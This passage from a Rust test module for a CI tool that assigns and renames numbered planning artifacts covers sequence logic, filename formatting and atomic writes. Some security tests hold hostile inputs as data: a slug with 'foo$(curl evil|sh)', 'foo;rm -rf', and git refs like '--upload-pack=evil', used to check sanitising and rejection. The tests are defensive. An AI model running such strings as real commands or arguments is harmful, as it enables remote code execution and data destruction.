    /// Sequence stays at max_in_base; new candidates get max+1, max+2.
    /// No regression to gradient-correct happy path.
    #[test]
    fn compute_plan_max_with_explicit_existing_below_base() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-base.md",
            &artifact("prd-base", 73, Some("73")),
        )]);
        let candidates = vec![
            Candidate {
                slug: "prd-old".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-old.md"),
                predicted_number: None,
                current_assigned: Some(70), // below base max
            },
            Candidate {
                slug: "prd-new".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-new.md"),
                predicted_number: None,
                current_assigned: None,
            },
        ];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        let new_item = plan.iter().find(|p| p.candidate.slug == "prd-new").unwrap();
        // max(seq=73, existing=70) = 73; new gets 74.
        assert_eq!(new_item.assigned_number, 74);
    }

    // FIX-6 [CR-5]: display_id renders canonical prefixes (PROB/SOL/EVID/REF).

    #[test]
    fn display_id_renders_problem_with_canonical_prefix() {
        assert_eq!(display_id("problem", 60), "PROB-060");
    }

    #[test]
    fn display_id_renders_solution_with_canonical_prefix() {
        assert_eq!(display_id("solution", 1), "SOL-001");
    }

    #[test]
    fn display_id_renders_evidence_with_canonical_prefix() {
        assert_eq!(display_id("evidence", 114), "EVID-114");
    }

    #[test]
    fn display_id_renders_refresh_with_canonical_prefix() {
        assert_eq!(display_id("refresh", 5), "REF-005");
    }

    #[test]
    fn display_id_renders_remaining_kinds_unchanged() {
        // Pre-fix kinds that already produced the right prefix must not regress.
        assert_eq!(display_id("prd", 76), "PRD-076");
        assert_eq!(display_id("rfc", 9), "RFC-009");
        assert_eq!(display_id("adr", 12), "ADR-012");
        assert_eq!(display_id("epic", 1), "EPIC-001");
        assert_eq!(display_id("spec", 5), "SPEC-005");
        assert_eq!(display_id("note", 1), "NOTE-001");
        assert_eq!(display_id("memory", 1), "MEM-001");
    }

    #[test]
    fn build_commit_message_uses_canonical_prefix_for_problem() {
        let assignments = vec![Assignment {
            slug: "prob-api-panic".to_string(),
            kind: "problem".to_string(),
            path: "p.md".to_string(),
            predicted_number: None,
            assigned_number: 60,
            max_in_base: None,
            action: "assigned".to_string(),
        }];
        let msg = build_commit_message(123, &assignments);
        assert!(msg.contains("PROB-060"), "expected PROB-060, got: {msg}");
        assert!(
            !msg.contains("PROBLEM-060"),
            "must not use stem template_key"
        );
    }

    // FIX-2 Part C [CWE-94]: sanitize_for_commit_msg.

    #[test]
    fn sanitize_for_commit_msg_passes_clean_slug() {
        assert_eq!(
            sanitize_for_commit_msg("prd-auth-system"),
            "prd-auth-system"
        );
        assert_eq!(sanitize_for_commit_msg("evid-114"), "evid-114");
        assert_eq!(sanitize_for_commit_msg("v0.29.0"), "v0.29.0");
    }

    #[test]
    fn sanitize_for_commit_msg_strips_shell_metacharacters() {
        // "foo$(curl evil|sh)" → 'foo' + '$' + '(' + 'curl' + ' ' + 'evil'
        //   + '|' + 'sh' + ')'  →  'foo' + '_' + '_' + 'curl' + '_' + 'evil'
        //   + '_' + 'sh' + '_'
        assert_eq!(
            sanitize_for_commit_msg("foo$(curl evil|sh)"),
            "foo__curl_evil_sh_"
        );
        assert_eq!(sanitize_for_commit_msg("foo`evil`"), "foo_evil_");
        assert_eq!(sanitize_for_commit_msg("foo\"evil\""), "foo_evil_");
        assert_eq!(sanitize_for_commit_msg("foo'evil'"), "foo_evil_");
        assert_eq!(sanitize_for_commit_msg("foo;rm -rf"), "foo_rm_-rf");
    }

    #[test]
    fn sanitize_for_commit_msg_strips_control_chars() {
        assert_eq!(sanitize_for_commit_msg("foo\nbar"), "foo_bar");
        assert_eq!(sanitize_for_commit_msg("foo\tbar"), "foo_bar");
        assert_eq!(sanitize_for_commit_msg("foo\rbar"), "foo_bar");
        assert_eq!(sanitize_for_commit_msg("foo\x00bar"), "foo_bar");
    }

    /// Defense-in-depth integration: a slug что-то somehow bypasses
    /// validate_slug should still produce a sanitized commit message.
    /// Direct call to build_commit_message с tampered slug.
    #[test]
    fn build_commit_message_sanitizes_slug_in_body() {
        let assignments = vec![Assignment {
            slug: "prd-a$(curl evil|sh)".to_string(),
            kind: "prd".to_string(),
            path: "p.md".to_string(),
            predicted_number: None,
            assigned_number: 1,
            max_in_base: None,
            action: "assigned".to_string(),
        }];
        let msg = build_commit_message(1, &assignments);
        assert!(
            !msg.contains("$("),
            "shell substitution syntax must be neutralized: {msg}"
        );
        assert!(!msg.contains('|'), "pipe must be neutralized: {msg}");
        assert!(!msg.contains('`'), "backtick must be neutralized: {msg}");
    }

    // FIX-1 [CWE-88] propagation: run() rejects bad refs early.

    #[test]
    fn run_rejects_malicious_base_ref() {
        let tmp = init_git_with_files(&[]);
        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "--upload-pack=evil".to_string(),
            head: "HEAD".to_string(),
            json: true,
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_CONFIG_ERROR);
    }

    #[test]
    fn run_rejects_malicious_head_ref() {
        let tmp = init_git_with_files(&[]);
        let args = CiAssignIdArgs {
            workspace: Some(tmp.path().to_path_buf()),
            base: "dev".to_string(),
            head: "-rf".to_string(),
            json: true,
            ..Default::default()
        };
        let exit = tokio_test_block(async move { super::run(args).await.unwrap() });
        assert_eq!(exit, EXIT_CONFIG_ERROR);
    }

    // ---------------------------------------------------------------
    // PROB-060 Phase 0b Round 2 — additional closures
    // ---------------------------------------------------------------

    // CLOSE-2 [SEC-6 CWE-367] — symlink + canonical path + atomic write.

    #[cfg(unix)]
    #[test]
    fn apply_plan_rejects_symlink_artifact() {
        use std::os::unix::fs::symlink;
        let tmp = TempDir::new().unwrap();
        // Create a real file outside .forgeplan/, and a symlink inside it.
        let target = tmp.path().join("real.md");
        fs::write(&target, artifact("prd-x", 74, None)).unwrap();
        let sym_dir = tmp.path().join(".forgeplan/prds");
        fs::create_dir_all(&sym_dir).unwrap();
        let sym = sym_dir.join("prd-x.md");
        symlink(&target, &sym).unwrap();

        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-x".to_string(),
                kind: ArtifactKind::Prd,
                path: sym.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let err =
            apply_plan(tmp.path(), &plan, false).expect_err("symlink artifact must be rejected");
        let msg = format!("{err:#}");
        assert!(
            msg.contains("symlink"),
            "expected symlink rejection message, got: {msg}"
        );
        // The real file must remain unchanged.
        let after = fs::read_to_string(&target).unwrap();
        assert!(after.contains("assigned_number: null"));
    }

    /// CLOSE-2 [SEC-6]: a candidate path that, after canonicalization,
    /// resolves outside the workspace must be rejected. We simulate this
    /// by canonicalizing the workspace first, then constructing a path
    /// in a sibling temp dir.
    #[test]
    fn apply_plan_rejects_path_outside_workspace() {
        let ws = TempDir::new().unwrap();
        let outside = TempDir::new().unwrap();
        let outside_path = outside.path().join("evil.md");
        fs::write(&outside_path, artifact("prd-evil", 1, None)).unwrap();

        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-evil".to_string(),
                kind: ArtifactKind::Prd,
                path: outside_path.clone(),
                predicted_number: Some(1),
                current_assigned: None,
            },
            assigned_number: 1,
            max_in_base: None,
            already_assigned: false,
            collision: None,
        }];
        let err = apply_plan(ws.path(), &plan, false)
            .expect_err("path outside workspace must be rejected");
        let msg = format!("{err:#}");
        assert!(
            msg.contains("escapes workspace") || msg.contains("invariant"),
            "expected escape-workspace rejection, got: {msg}"
        );
    }

    /// [Round 3 Sec FINDING-12] Two `apply_plan` invocations on
    /// distinct artifacts in the same parent dir used to potentially
    /// collide on the deterministic `<path>.md.tmp` suffix. Switching
    /// to `tempfile::NamedTempFile::new_in` makes each invocation pick
    /// its own unique tmp filename. This test runs two writes
    /// back-to-back and asserts both succeed, no `*.md.tmp` sibling
    /// remains, and both destinations carry the expected
    /// `assigned_number`. (Strict thread-level interleaving is not
    /// needed: the bug is the deterministic name itself.)
    #[test]
    fn apply_plan_unique_tmp_filenames_no_collision() {
        let tmp = TempDir::new().unwrap();
        let prds = tmp.path().join(".forgeplan/prds");
        fs::create_dir_all(&prds).unwrap();
        let path_a = prds.join("prd-a.md");
        let path_b = prds.join("prd-b.md");
        fs::write(&path_a, artifact("prd-a", 74, None)).unwrap();
        fs::write(&path_b, artifact("prd-b", 75, None)).unwrap();

        let plan = vec![
            PlanItem {
                candidate: Candidate {
                    slug: "prd-a".to_string(),
                    kind: ArtifactKind::Prd,
                    path: path_a.clone(),
                    predicted_number: Some(74),
                    current_assigned: None,
                },
                assigned_number: 74,
                max_in_base: Some(73),
                already_assigned: false,
                collision: None,
            },
            PlanItem {
                candidate: Candidate {
                    slug: "prd-b".to_string(),
                    kind: ArtifactKind::Prd,
                    path: path_b.clone(),
                    predicted_number: Some(75),
                    current_assigned: None,
                },
                assigned_number: 75,
                max_in_base: Some(73),
                already_assigned: false,
                collision: None,
            },
        ];
        let (assignments, collisions) = apply_plan(tmp.path(), &plan, false).unwrap();
        assert!(collisions.is_empty());
        assert_eq!(assignments.len(), 2);

        // Both targets exist after rename, neither tmp sibling leaks.
        let renamed_a = prds.join("PRD-074-a.md");
        let renamed_b = prds.join("PRD-075-b.md");
        assert!(renamed_a.exists() && renamed_b.exists());
        assert!(!path_a.with_extension("md.tmp").exists());
        assert!(!path_b.with_extension("md.tmp").exists());
        assert!(!renamed_a.with_extension("md.tmp").exists());
        assert!(!renamed_b.with_extension("md.tmp").exists());

        // No stray tmp filename leaked into the parent dir under the
        // new `NamedTempFile` strategy either (which uses random
        // suffixes — they would all be auto-removed on drop).
        let leftover: Vec<_> = fs::read_dir(&prds)
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.contains(".tmp"))
            .collect();
        assert!(
            leftover.is_empty(),
            "no tmp leftovers expected, found: {leftover:?}"
        );
    }

    /// CLOSE-2 [SEC-6]: success path uses the atomic write pattern.
    /// We can't easily kill mid-write from a unit test, but we can assert
    /// (a) the final file is the new content, (b) no `*.md.tmp` sibling
    /// is left behind, and (c) the file's content is fully formed.
    #[test]
    fn apply_plan_atomic_write_no_partial_state() {
        let tmp = TempDir::new().unwrap();
        let prds = tmp.path().join(".forgeplan/prds");
        fs::create_dir_all(&prds).unwrap();
        let path = prds.join("prd-x.md");
        let original = artifact("prd-x", 74, None);
        fs::write(&path, &original).unwrap();

        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-x".to_string(),
                kind: ArtifactKind::Prd,
                path: path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let (assignments, collisions) = apply_plan(tmp.path(), &plan, false).unwrap();
        assert!(collisions.is_empty());
        assert_eq!(assignments.len(), 1);

        // PROB-060 Phase 2.2 [CD-4]: file got renamed to its display-id
        // target. Original placeholder filename should be gone, and the
        // atomic-write invariant (no `.md.tmp` sibling, trailing
        // newline preserved) holds at the new path.
        let renamed = prds.join("PRD-074-x.md");
        assert!(renamed.exists(), "rename target should exist");
        let after = fs::read_to_string(&renamed).unwrap();
        assert!(after.contains("assigned_number: 74"));
        // No tmp sibling left behind on either old or new path.
        let tmp_sibling_old = path.with_extension("md.tmp");
        let tmp_sibling_new = renamed.with_extension("md.tmp");
        assert!(
            !tmp_sibling_old.exists() && !tmp_sibling_new.exists(),
            "atomic write must rename, not leave .tmp sibling"
        );
        // Trailing newline preserved (well-formed file, not truncated).
        assert!(after.ends_with('\n'), "file must be fully written");
    }

    // CLOSE-5 [E2E-2] — 2-pass compute_assignment_plan absorbs all
    // existing assigned_numbers before assigning nulls, regardless of
    // input order.

    #[test]
    fn compute_plan_existing_after_null_no_overlap() {
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-existing.md",
            &artifact("prd-existing", 73, Some("73")),
        )]);
        // Input order: [null, null, existing=80] — existing comes LAST.
        let candidates = vec![
            Candidate {
                slug: "prd-null-a".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-null-a.md"),
                predicted_number: None,
                current_assigned: None,
            },
            Candidate {
                slug: "prd-null-b".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-null-b.md"),
                predicted_number: None,
                current_assigned: None,
            },
            Candidate {
                slug: "prd-existing-80".to_string(),
                kind: ArtifactKind::Prd,
                path: tmp.path().join(".forgeplan/prds/prd-existing-80.md"),
                predicted_number: Some(80),
                current_assigned: Some(80),
            },
        ];
        let plan = compute_assignment_plan(tmp.path(), "dev", &candidates).unwrap();
        assert_eq!(plan.len(), 3);

        let existing = plan
            .iter()
            .find(|p| p.candidate.slug == "prd-existing-80")
            .unwrap();
        assert_eq!(existing.assigned_number, 80);
        assert!(existing.already_assigned);

        // Nulls must mint 81 and 82 — NOT 74 and 75.
        let nulls: Vec<u32> = plan
            .iter()
            .filter(|p| !p.already_assigned)
            .map(|p| p.assigned_number)
            .collect();
        let mut sorted = nulls.clone();
        sorted.sort();
        assert_eq!(
            sorted,
            vec![81, 82],
            "nulls must mint above absorbed existing=80, got {nulls:?}"
        );
    }

    // CLOSE-7 [CR-6] — parse_repo_from_url unit tests.

    #[test]
    fn parse_repo_from_url_ssh_with_dot_git() {
        assert_eq!(
            parse_repo_from_url("git@github.com:org/repo.git"),
            Some("org/repo".to_string())
        );
    }

    #[test]
    fn parse_repo_from_url_ssh_no_dot_git() {
        assert_eq!(
            parse_repo_from_url("git@github.com:org/repo"),
            Some("org/repo".to_string())
        );
    }

    #[test]
    fn parse_repo_from_url_https_with_dot_git() {
        assert_eq!(
            parse_repo_from_url("https://github.com/org/repo.git"),
            Some("org/repo".to_string())
        );
    }

    #[test]
    fn parse_repo_from_url_https_no_dot_git() {
        assert_eq!(
            parse_repo_from_url("https://github.com/org/repo"),
            Some("org/repo".to_string())
        );
    }

    #[test]
    fn parse_repo_from_url_multi_segment_gitlab_ssh() {
        assert_eq!(
            parse_repo_from_url("git@gitlab.com:group/sub/repo.git"),
            Some("group/sub/repo".to_string())
        );
    }

    #[test]
    fn parse_repo_from_url_empty_returns_none() {
        assert_eq!(parse_repo_from_url(""), None);
        assert_eq!(parse_repo_from_url("   "), None);
    }

    #[test]
    fn parse_repo_from_url_garbage_returns_none() {
        assert_eq!(parse_repo_from_url("not-a-url"), None);
        assert_eq!(parse_repo_from_url("just-text"), None);
    }

    // PROB-060 Phase 2.2 [CD-4] — file rename atomicity tests.

    #[test]
    fn target_filename_strips_kind_prefix_for_prd() {
        assert_eq!(
            target_filename(&ArtifactKind::Prd, "prd-auth-system", 74),
            "PRD-074-auth-system.md"
        );
    }

    #[test]
    fn target_filename_handles_problem_card_prefix() {
        // ProblemCard's prefix is `prob-` and display key is `PROB`.
        assert_eq!(
            target_filename(&ArtifactKind::ProblemCard, "prob-id-collisions", 60),
            "PROB-060-id-collisions.md"
        );
    }

    #[test]
    fn target_filename_handles_evidence_pack_prefix() {
        assert_eq!(
            target_filename(&ArtifactKind::EvidencePack, "evid-real-stress-test", 114),
            "EVID-114-real-stress-test.md"
        );
    }

    #[test]
    fn target_filename_handles_solution_refresh_note() {
        assert_eq!(
            target_filename(&ArtifactKind::SolutionPortfolio, "sol-foo", 1),
            "SOL-001-foo.md"
        );
        assert_eq!(
            target_filename(&ArtifactKind::RefreshReport, "ref-revisit-x", 5),
            "REF-005-revisit-x.md"
        );
        assert_eq!(
            target_filename(&ArtifactKind::Note, "note-quick-decision", 1),
            "NOTE-001-quick-decision.md"
        );
    }

    #[test]
    fn target_filename_zero_pads_three_digits() {
        assert_eq!(
            target_filename(&ArtifactKind::Prd, "prd-tiny", 1),
            "PRD-001-tiny.md"
        );
        assert_eq!(
            target_filename(&ArtifactKind::Prd, "prd-big", 999),
            "PRD-999-big.md"
        );
        // Numbers above 999 are exceptional но не truncated — `:03` is
        // a minimum width, not a maximum.
        assert_eq!(
            target_filename(&ArtifactKind::Prd, "prd-huge", 1234),
            "PRD-1234-huge.md"
        );
    }

    #[test]
    fn target_filename_handles_multi_dash_slug_suffix() {
        assert_eq!(
            target_filename(&ArtifactKind::Rfc, "rfc-id-assignment-v2", 9),
            "RFC-009-id-assignment-v2.md"
        );
    }

    /// Phase 2.2 fresh-assignment path: PR introduces an unnumbered
    /// artifact, [`apply_plan`] should rewrite the frontmatter AND
    /// rename the file to the display-id-prefixed target. Action must
    /// surface the additive `renamed_and_assigned` enum variant.
    #[test]
    fn apply_plan_renames_file_after_assign() {
        let tmp = TempDir::new().unwrap();
        let prds = tmp.path().join(".forgeplan/prds");
        fs::create_dir_all(&prds).unwrap();
        let original_path = prds.join("prd-auth-system.md");
        fs::write(&original_path, artifact("prd-auth-system", 74, None)).unwrap();

        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-auth-system".to_string(),
                kind: ArtifactKind::Prd,
                path: original_path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let (assignments, collisions) = apply_plan(tmp.path(), &plan, false).unwrap();
        assert!(collisions.is_empty());
        assert_eq!(assignments.len(), 1);
        assert_eq!(
            assignments[0].action, "renamed_and_assigned",
            "fresh assign + rename should report `renamed_and_assigned`"
        );

        // File at the old path must be gone.
        assert!(
            !original_path.exists(),
            "old filename must be removed after rename"
        );
        // File at the new path must exist with rewritten frontmatter.
        let new_path = prds.join("PRD-074-auth-system.md");
        assert!(
            new_path.exists(),
            "renamed target {} must exist",
            new_path.display()
        );
        let content = fs::read_to_string(&new_path).unwrap();
        assert!(
            content.contains("assigned_number: 74"),
            "frontmatter rewrite must persist on the renamed file"
        );
        // No `.tmp` sibling should be left behind.
        let tmp_sibling = original_path.with_extension("md.tmp");
        assert!(
            !tmp_sibling.exists(),
            "atomic write must not leave a .tmp sibling"
        );
        // Assignment.path should reflect the post-rename basename.
        assert!(
            assignments[0].path.ends_with("PRD-074-auth-system.md"),
            "Assignment.path should reflect post-rename filename, got: {}",
            assignments[0].path
        );
    }

    /// Idempotent re-run: an artifact already at its display-id
    /// filename and already carrying `assigned_number` produces a
    /// `skipped_already_assigned` action and no filesystem mutation.
    #[test]
    fn apply_plan_idempotent_for_already_renamed() {
        let tmp = TempDir::new().unwrap();
        let prds = tmp.path().join(".forgeplan/prds");
        fs::create_dir_all(&prds).unwrap();
        let path = prds.join("PRD-074-auth-system.md");
        let original_content = artifact("prd-auth-system", 74, Some("74"));
        fs::write(&path, &original_content).unwrap();
        let original_mtime = fs::metadata(&path).unwrap().modified().ok();

        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-auth-system".to_string(),
                kind: ArtifactKind::Prd,
                path: path.clone(),
                predicted_number: Some(74),
                current_assigned: Some(74),
            },
            assigned_number: 74,
            max_in_base: Some(74),
            already_assigned: true,
            collision: None,
        }];
        let (assignments, collisions) = apply_plan(tmp.path(), &plan, false).unwrap();

        assert!(collisions.is_empty());
        assert_eq!(assignments.len(), 1);
        assert_eq!(
            assignments[0].action, "skipped_already_assigned",
            "already-assigned + already-renamed should be a no-op"
        );

        // File still at the same path with identical content.
        assert!(path.exists(), "file must still exist at its current path");
        let after = fs::read_to_string(&path).unwrap();
        assert_eq!(
            after, original_content,
            "no-op run must not modify file contents"
        );
        // mtime should not have changed (best-effort assertion — some
        // filesystems have coarse mtime resolution; we skip if either
        // read returned None).
        if let (Some(before), Ok(meta_after)) = (original_mtime, fs::metadata(&path))
            && let Ok(after_mtime) = meta_after.modified()
        {
            assert_eq!(
                before, after_mtime,
                "no-op run must not touch mtime (coarse fs may flake — \
                 remove this assertion if it does)"
            );
        }

        // Assignment.path is unchanged.
        assert!(
            assignments[0].path.ends_with("PRD-074-auth-system.md"),
            "Assignment.path on no-op should reflect unchanged filename"
        );
    }

    /// Recovery path: a previous run rewrote frontmatter (assigned_number
    /// is set) but crashed before the rename. Re-running should NOT
    /// rewrite the frontmatter again (`already_assigned: true`) but
    /// SHOULD complete the rename, producing the `renamed` action.
    #[test]
    fn apply_plan_recovers_partial_rename_with_renamed_action() {
        let tmp = TempDir::new().unwrap();
        let prds = tmp.path().join(".forgeplan/prds");
        fs::create_dir_all(&prds).unwrap();
        let original_path = prds.join("prd-auth-system.md");
        // Frontmatter already has assigned_number = 74 (Phase 1 partial state).
        fs::write(&original_path, artifact("prd-auth-system", 74, Some("74"))).unwrap();

        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-auth-system".to_string(),
                kind: ArtifactKind::Prd,
                path: original_path.clone(),
                predicted_number: Some(74),
                current_assigned: Some(74),
            },
            assigned_number: 74,
            max_in_base: Some(74),
            already_assigned: true,
            collision: None,
        }];
        let (assignments, collisions) = apply_plan(tmp.path(), &plan, false).unwrap();

        assert!(collisions.is_empty());
        assert_eq!(assignments.len(), 1);
        assert_eq!(
            assignments[0].action, "renamed",
            "already_assigned + needs_rename should produce `renamed` action"
        );
        assert!(!original_path.exists(), "old filename should be gone");
        let new_path = prds.join("PRD-074-auth-system.md");
        assert!(new_path.exists(), "rename target should exist");
        // Frontmatter unchanged (no rewrite on already_assigned path).
        let content = fs::read_to_string(&new_path).unwrap();
        assert!(content.contains("assigned_number: 74"));
        assert!(
            assignments[0].path.ends_with("PRD-074-auth-system.md"),
            "Assignment.path should reflect post-rename filename"
        );
    }

    /// Dry-run remains side-effect-free — even when a rename would
    /// occur in a real run, no filesystem mutation happens and the
    /// action stays at `would_assign`.
    #[test]
    fn apply_plan_dry_run_does_not_rename() {
        let tmp = TempDir::new().unwrap();
        let prds = tmp.path().join(".forgeplan/prds");
        fs::create_dir_all(&prds).unwrap();
        let original_path = prds.join("prd-auth-system.md");
        let original_content = artifact("prd-auth-system", 74, None);
        fs::write(&original_path, &original_content).unwrap();

        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-auth-system".to_string(),
                kind: ArtifactKind::Prd,
                path: original_path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let (assignments, _) = apply_plan(tmp.path(), &plan, true).unwrap();

        assert_eq!(assignments[0].action, "would_assign");
        assert!(original_path.exists(), "dry-run must not move the file");
        let new_path = prds.join("PRD-074-auth-system.md");
        assert!(
            !new_path.exists(),
            "dry-run must not create the rename target"
        );
        let after = fs::read_to_string(&original_path).unwrap();
        assert_eq!(
            after, original_content,
            "dry-run must not modify file contents"
        );
    }

    /// Inside a real git work tree the rename invokes `git mv`, which
    /// records the move in the index for blame/history continuity.
    /// Verify the file exists at its new path AND `git status` reports
    /// it as a rename rather than untracked + deleted.
    #[test]
    fn apply_plan_uses_git_mv_when_inside_repo() {
        // init_git_with_files commits `.gitkeep` + given fixtures on `dev`,
        // so the artifact below is git-tracked when apply_plan runs.
        let tmp = init_git_with_files(&[(
            ".forgeplan/prds/prd-auth-system.md",
            &artifact("prd-auth-system", 74, None),
        )]);
        let original_path = tmp.path().join(".forgeplan/prds/prd-auth-system.md");
        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-auth-system".to_string(),
                kind: ArtifactKind::Prd,
                path: original_path.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let (assignments, _) = apply_plan(tmp.path(), &plan, false).unwrap();
        assert_eq!(assignments[0].action, "renamed_and_assigned");
        let new_path = tmp.path().join(".forgeplan/prds/PRD-074-auth-system.md");
        assert!(new_path.exists(), "rename target should exist");
        assert!(!original_path.exists(), "old filename should be gone");

        // `git status --porcelain=v1` should reflect either a rename
        // (`R  old -> new`) or an add+delete pair. Either way the file
        // must appear in the index — `git mv` did not leave it
        // untracked. We assert the new path appears in the porcelain
        // output as a not-untracked entry.
        let status = std::process::Command::new("git")
            .args(["status", "--porcelain=v1"])
            .current_dir(tmp.path())
            .output()
            .expect("git status");
        let porcelain = String::from_utf8_lossy(&status.stdout);
        // Untracked entries start with "??". Renames start with "R" or
        // "AM"/"M ". The new file must NOT appear as `??`.
        let new_basename = "PRD-074-auth-system.md";
        let new_untracked = porcelain
            .lines()
            .any(|line| line.starts_with("??") && line.contains(new_basename));
        assert!(
            !new_untracked,
            "renamed file must not show as untracked in git status; porcelain = {porcelain}"
        );
        // And the new path should appear somewhere in the porcelain
        // (rename target or add).
        assert!(
            porcelain.contains(new_basename),
            "renamed file must appear in git status; porcelain = {porcelain}"
        );
    }

    /// Refusing to clobber an existing distinct file at the rename
    /// target. SEC-5 collision invariant: a separate file already
    /// occupying `PRD-074-auth-system.md` blocks the rename rather
    /// than silently overwriting it.
    #[test]
    fn apply_plan_refuses_to_clobber_existing_target() {
        let tmp = TempDir::new().unwrap();
        let prds = tmp.path().join(".forgeplan/prds");
        fs::create_dir_all(&prds).unwrap();
        let from = prds.join("prd-auth-system.md");
        let to = prds.join("PRD-074-auth-system.md");
        fs::write(&from, artifact("prd-auth-system", 74, None)).unwrap();
        fs::write(&to, "---\nslug: prd-other\n---\n\nbody\n").unwrap();

        let plan = vec![PlanItem {
            candidate: Candidate {
                slug: "prd-auth-system".to_string(),
                kind: ArtifactKind::Prd,
                path: from.clone(),
                predicted_number: Some(74),
                current_assigned: None,
            },
            assigned_number: 74,
            max_in_base: Some(73),
            already_assigned: false,
            collision: None,
        }];
        let err = apply_plan(tmp.path(), &plan, false)
            .expect_err("rename onto existing distinct file must fail");
        let msg = format!("{err:#}");
        assert!(
            msg.contains("already exists") || msg.contains("collision"),
            "expected SEC-5 collision rejection, got: {msg}"
        );
        // Both files must remain.
        assert!(to.exists(), "existing target must not be deleted");
    }

    /// JSON schema_version stays at 1 even with the new action variants
    /// — additive enum extension per CD-3.
    #[test]
    fn json_schema_version_unchanged_after_phase_2_2() {
        let out = CiAssignIdOutput {
            schema_version: JSON_SCHEMA_VERSION,
            ran_at: "2026-05-07T00:00:00Z".to_string(),
            pr: 1,
            repo: String::new(),
            base: "origin/dev".to_string(),
            head: "HEAD".to_string(),
            dry_run: false,
            assignments: vec![Assignment {
                slug: "prd-x".to_string(),
                kind: "prd".to_string(),
                path: ".forgeplan/prds/PRD-074-x.md".to_string(),
                predicted_number: Some(74),
                assigned_number: 74,
                max_in_base: Some(73),
                action: "renamed_and_assigned".to_string(),
            }],
            collisions: vec![],
            summary: Summary {
                total_candidates: 1,
                assigned: 1,
                skipped_already_assigned: 0,
                collisions: 0,
                exit_code: 0,
            },
            commit_message_suggested: String::new(),
        };
        let json = render_json_summary(&out).unwrap();
        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
        assert_eq!(
            parsed["schema_version"], 1,
            "Phase 2.2 must remain on schema_version=1 (additive action enum)"
        );
        assert_eq!(parsed["assignments"][0]["action"], "renamed_and_assigned");
    }

    /// CRIT-2 Layer B: When artifacts exist in base for a kind, reject pre-set
    /// assigned_number on new artifacts. When base_files is empty for a kind,
    /// allow re-processing of idempotent assignments.
    ///
    /// Integration test in .github/workflows/ci.yml validates this via the
    /// validate-forgeplan-frontmatter.sh script + Rust binary error handling.
    /// Unit tests for the individual pieces:
    /// - compute_plan_idempotent_for_already_assigned (empty base → allow)
    /// - INTEGRATION: real PR validation via CI workflow
    #[test]
    fn crit2_layer_b_defense_documented() {
        // CRIT-2 defense-in-depth chain:
        // 1. Bash validator (Layer A): rejects pre-set assigned_number in new artifacts
        // 2. Rust binary (Layer B): detects when new artifact (not in base) has
        //    assigned_number and exits with EXIT_INVARIANT_VIOLATION (4)
        // 3. ci.yml error reporting layer: catches the non-zero exit code
        //    and surfaces "INVARIANT VIOLATION" в the PR check output.
        //
        // [Round 3 Code FINDING-7] The third tier here is the **ci.yml
        // error reporting layer** — distinct from the unimplemented
        // "Layer C: per-file base partition" called out in Round 2 Sec
        // FINDING-11 (deferred separately, tracking artifact TBD). The
        // earlier "Layer C" name was a docstring-only collision. Avoid
        // reusing that label here so audit-doc readers don't conflate
        // the two. The defense chain documented in this test is
        // (Layer A: bash) → (Layer B: Rust binary `compute_assignment_plan`)
        // → (ci.yml exit-code surfacing).
        //
        // Test fixtures: compute_plan_idempotent_for_already_assigned validates
        // that empty base_files allows re-processing (idempotent).
        // Real-world: a PR with a new artifact carrying pre-set assigned_number
        // will be caught by both bash validator and Rust binary.
    }

    /// [Round 2 Sec FINDING-3] Layer B's `exists_in_base` predicate must
    /// reject substring-overlap matches.
    ///
    /// Pre-fix logic at the audited site was:
    /// ```text
    /// f.ends_with(&format!("{}.md", c.slug)) ||
    ///     f.contains(&format!("{}-", c.slug))
    /// ```
    ///
    /// Two failure modes:
    /// * **False positive** — a base filename like
    ///   `prd-auth-system-deprecated.md` (some unrelated artifact whose slug
    ///   merely *starts with* the candidate's slug) would match
    ///   `f.contains("prd-auth-system-")` and a tampered NEW artifact whose
    ///   slug is `prd-auth-system` carrying a pre-set `assigned_number`
    ///   would slip through Layer B.
    /// * **False negative** — case-sensitive compare missed the post-merge
    ///   uppercase form (`PRD-074-auth-system.md`), causing legitimate
    ///   idempotent re-runs to bail with INVARIANT VIOLATION.
    ///
    /// We test the predicate (`slug_exists_in_filenames`) directly because
    /// `compute_assignment_plan`'s `base_files` source
    /// (`artifact_filenames_in_origin_dev`) hardcodes `origin/dev` and an
    /// in-process unit test cannot easily set up a remote — the integration
    /// test in `.github/workflows/ci.yml` is the end-to-end coverage. The
    /// predicate-level test pins the contract Layer B now relies on.
    #[test]
